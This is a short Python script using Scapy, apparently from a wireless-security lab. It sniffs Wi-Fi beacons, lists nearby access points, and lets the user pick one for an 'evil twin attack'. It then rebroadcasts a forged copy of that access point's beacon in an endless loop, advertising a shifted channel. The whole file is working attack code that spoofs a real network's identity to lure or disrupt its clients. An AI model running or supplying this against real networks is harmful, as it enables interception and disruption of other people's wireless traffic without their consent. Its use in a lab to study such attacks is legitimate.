"""
This scrippt needs airodump-ng started, to have some channel hopping.
"""
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt

pkt_full_list = []
bssid_list = []
counter = 0
interface = input("Enter interface to listed on (must be on monitor mode) : \n")
print("APs will be listed here, wait 20s and choose one :\n")


def pkt_callback(pkt):
    """
    Fonction utilisée lors du sniff pour analyser les paquets.
    Elle permet de filtrer les BSSIDs déjà vu et d'afficher les nouveaux.
    Nous ne filtrons pas les SSIDs par channel (Ce que nous pourrions faire pour éviter les None mais pas fait pour afficher tout les APs).
    """
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt.getlayer(Dot11).addr2.upper()
        if bssid not in bssid_list:
            # Save bssid (to not print again) and the associated packet to use it in the attack
            bssid_list.append(bssid)
            pkt_full_list.append(pkt)
            try:
                dbm_signal = pkt.dBm_AntSignal
            except:
                dbm_signal = "N/A"
            # extract network stats
            stats = pkt[Dot11Beacon].network_stats()
            # get the channel of the AP
            channel = stats.get("channel")
            global counter
            counter += 1
            print(counter, " : \t", bssid, " SSID : ", pkt[Dot11].info, " Channel : ", channel, "RSSI : ", dbm_signal)


sniff(iface=interface, prn=pkt_callback, timeout=10, monitor=True)

evilTwinTarget = input("Choose one of the AP to do an evil twin attack :\n")
evilTwinTarget = int(evilTwinTarget)
pktSource = pkt_full_list[evilTwinTarget - 1]
print("Actual Channel : ", pktSource[Dot11Beacon].network_stats().get("channel"))

# Get current channel
channel = pktSource[Dot11Beacon].network_stats().get("channel")
newPkt = pktSource.copy()

'''
# Code propre (modifies le DSset proprement)
p = pktSource[Dot11Elt].payload
last = Dot11Elt(ID=pktSource[Dot11Elt].ID, info=pktSource[Dot11Elt].info, len=pktSource[Dot11Elt].len)
while isinstance(p, Dot11Elt):
    if p.ID == 3:
        p = p.payload
        break
    print(p.ID, " : ", p.info, " : ", p.len)
    last /= Dot11Elt(ID=p.ID, info=p.info, len=p.len)
    p = p.payload

newPkt[Dot11Elt] = last/Dot11Elt(ID="DSset", info=chr((channel + 6)%13), len=1)/p
'''

# On rajoute juste un DSset à la fin, selon nos tests avec airodump cela fonctionnes aussi
newPkt = newPkt / Dot11Elt(ID="DSset", info=chr((channel + 6) % 13))

# Grâce à ces show l'on peut voir la structure des paquets, si l'on utilise la version du code propre on peut voir
# que la structure et la même. print(pktSource.show()) print(newPkt.show())
newChannel = newPkt[Dot11Beacon].network_stats().get("channel")
print("New Channel : ", newChannel)

sendp(newPkt, inter=0.01, loop=1, iface=interface, monitor=True)
